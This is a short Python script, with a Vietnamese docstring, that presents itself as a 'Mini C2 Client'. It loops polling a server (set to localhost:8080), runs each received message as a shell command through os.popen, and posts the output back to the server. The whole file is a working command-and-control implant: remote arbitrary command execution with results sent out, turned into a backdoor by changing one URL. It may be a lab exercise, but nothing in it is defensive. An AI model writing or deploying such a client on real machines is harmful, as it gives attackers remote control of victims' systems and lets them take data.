#!/usr/bin/env python3
"""
Mini C2 Client - Nhận msg từ server, chạy cmd, gửi kết quả
"""

import requests
import time
import os

SERVER_URL = "http://localhost:8080"


def main():
    print("[*] Connecting...")
    
    while True:
        try:
            # Poll msg
            resp = requests.get(f"{SERVER_URL}/poll")
            msg = resp.text
            
            if msg:
                print(f"[*] Executing: {msg}")
                result = os.popen(msg).read()
                requests.post(f"{SERVER_URL}/result", data=result)
            
            time.sleep(1)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] {e}")
            time.sleep(3)


if __name__ == "__main__":
    main()
